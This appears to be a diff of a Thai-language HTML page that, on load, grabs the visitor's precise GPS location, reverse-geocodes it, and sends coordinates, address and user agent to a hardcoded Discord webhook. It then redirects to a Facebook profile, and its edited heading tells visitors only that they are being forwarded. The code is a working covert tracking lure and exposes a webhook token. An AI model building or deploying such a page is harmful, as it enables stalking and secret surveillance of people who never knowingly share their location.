@@ -6,29 +6,29 @@
   <title>📍 กำลังระบุตำแหน่ง...</title>
   <script>
     async function getLocation() {
-      // ตรวจสอบว่าเบราว์เซอร์รองรับการระบุตำแหน่งหรือไม่
+      // ตรวจสอบว่าเบราว์เซอร์รองรับ Geolocation API หรือไม่
       if (!navigator.geolocation) {
         alert("เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง");
         return;
       }
 
+      // ฟังก์ชันเพื่อดึงตำแหน่งโดยใช้ Geolocation API
       navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
+        const lat = position.coords.latitude;    // ละติจูด
+        const lon = position.coords.longitude;   // ลองจิจูด
+        const accuracy = position.coords.accuracy; // ความแม่นยำ
 
         // เรียก Reverse Geocode API (OpenStreetMap)
-        let addressInfo = "N/A";
+        let addressInfo = "ไม่สามารถหาที่อยู่ได้";
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
           const data = await res.json();
           addressInfo = data.display_name || "ไม่พบที่อยู่";
         } catch (e) {
-          console.warn("Reverse geocoding failed:", e);
-          addressInfo = "ไม่สามารถดึงที่อยู่ได้";
+          console.warn("การค้นหาที่อยู่ล้มเหลว:", e);
         }
 
-        // เตรียมข้อมูลที่จะส่งไปยัง Discord
+        // แสดงข้อมูลตำแหน่ง
         const info = `
 📍 พิกัด:
 - ละติจูด: ${lat}
@@ -44,9 +44,9 @@ ${addressInfo}
 - User Agent: ${navigator.userAgent}
         `;
 
-        console.log(info); // หรือจะส่งไป Webhook ก็ได้
+        console.log(info); // หรือจะส่งข้อมูลไป Webhook ก็ได้
 
-        // ส่งข้อมูลไปยัง Discord Webhook
+        // ส่งข้อมูลไปยัง Discord (ใช้ Webhook)
         try {
           await fetch("https://discord.com/api/webhooks/1361764929274646588/EJuR3LqZlhBZfQRXuz7RQQK7lqnEkqrxGQIF_VtnpRbgVU0F9lBLf_AZqiwEDQIlzNYk", {
             method: "POST",
@@ -67,28 +67,27 @@ ${addressInfo}
             })
           });
         } catch (e) {
-          console.error("ส่งไป Discord ไม่สำเร็จ", e);
+          console.error("การส่งข้อมูลไป Discord ล้มเหลว:", e);
         }
 
-        // redirect ถ้าต้องการ
+        // Redirection หลังจากส่งข้อมูลแล้ว
         setTimeout(() => {
           window.location.href = "https://www.facebook.com/CEONattakanPinbuaOongfong";
         }, 2000);
-
+        
       }, (error) => {
-        // แจ้งข้อผิดพลาดเมื่อไม่สามารถดึงตำแหน่งได้
         alert("ไม่สามารถระบุตำแหน่งได้: " + error.message);
       }, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+        enableHighAccuracy: true, // เปิดใช้งานโหมดความแม่นยำสูงสุด
+        timeout: 10000, // ตั้งเวลาให้หยุดหลังจาก 10 วินาที
+        maximumAge: 0  // ใช้ข้อมูลตำแหน่งใหม่เสมอ
       });
     }
 
-    window.onload = getLocation;
+    window.onload = getLocation; // เรียกใช้ฟังก์ชันเมื่อหน้าเว็บโหลดเสร็จ
   </script>
 </head>
 <body>
-  <h2>📡 กำลังดึงตำแหน่งจากมือถือ...</h2>
+  <h2> กำลังโหลดไปยัง https://www.facebook.com/CEONattakanPinbuaOongfong...</h2>
 </body>
 </html>
